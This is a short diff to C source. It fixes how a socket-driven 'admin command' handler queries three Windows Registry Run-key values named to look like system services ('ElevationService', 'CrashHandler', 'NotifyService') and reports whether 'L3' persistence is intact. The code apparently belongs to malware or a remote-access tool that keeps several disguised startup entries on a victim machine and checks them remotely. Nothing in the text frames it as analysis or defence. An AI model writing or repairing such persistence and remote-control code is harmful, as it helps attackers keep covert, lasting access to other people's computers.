@@ -280,9 +280,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         if (regOk) {
             DWORD type, size;
             char buf[MAX_PATH];
-            int r1 = RegQueryValueExA(hKey, "ElevationService", NULL, &type, (BYTE*)buf, &(size=sizeof(buf)));
-            int r2 = RegQueryValueExA(hKey, "CrashHandler", NULL, &type, (BYTE*)buf, &(size=sizeof(buf)));
-            int r3 = RegQueryValueExA(hKey, "NotifyService", NULL, &type, (BYTE*)buf, &(size=sizeof(buf)));
+            size = sizeof(buf);
+            int r1 = RegQueryValueExA(hKey, "ElevationService", NULL, &type, (BYTE*)buf, &size);
+            size = sizeof(buf);
+            int r2 = RegQueryValueExA(hKey, "CrashHandler", NULL, &type, (BYTE*)buf, &size);
+            size = sizeof(buf);
+            int r3 = RegQueryValueExA(hKey, "NotifyService", NULL, &type, (BYTE*)buf, &size);
             RegCloseKey(hKey);
             util_appendf(response, &resp_pos, "[L3] Registry Run keys: %s\n", 
                         (r1==ERROR_SUCCESS && r2==ERROR_SUCCESS && r3==ERROR_SUCCESS) ? "ALL OK" : "MISSING");
